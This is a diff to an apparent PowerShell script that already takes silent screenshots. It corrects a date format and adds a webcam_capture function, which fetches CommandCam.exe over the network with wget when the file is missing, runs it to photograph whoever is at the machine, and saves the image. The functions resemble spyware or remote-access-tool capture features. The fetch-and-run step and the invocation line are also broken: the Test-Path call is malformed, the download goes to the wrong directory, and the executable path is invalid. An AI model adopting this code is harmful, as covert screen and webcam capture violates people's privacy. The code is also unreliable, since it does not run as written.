@@ -14,7 +14,7 @@ function find_string ($string){
 # Return value:	$file (path to screenshot on local system)
 # Purpose:		takes a screenshot and saves it in the format screenshot_yyyy-mm-dd_H_M_s.
 function take_screenshot {
-	$file = "C:\Users\whatbatman\screenshot_$(get-date -format yyyymm-dd_H_M_s).bmp"
+	$file = "C:\Users\whatbatman\screenshot_$(get-date -format yyyy-mm-dd_H_M_s).bmp"
 
 	# get the dimensions of the screen 
 	$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -31,4 +31,37 @@ function take_screenshot {
 	
 	return $file
 }
+
+# Name:			webcam_capture
+# Parameters:	None
+# Return:		$file (path to image on local system)
+# Purpose:		takes a picture with the webcam. This requires an additional too we will pull down first use
+function webcam_capture {
+	# If we don't have the application required to screenshot, go get it. Then run it.
+	# If we already have it then this test will pass and will just run it.
+	if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
+		wget http://localhost/CommandCam.exe
+	}
+	
+	$date = Get-Date -format yyyy-mm-dd_H_M_s
+	
+	.C:\Program Files\CommandCam.exe /filename .pics$date.bmp
+	
+	return ".pics$date.bmp"
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
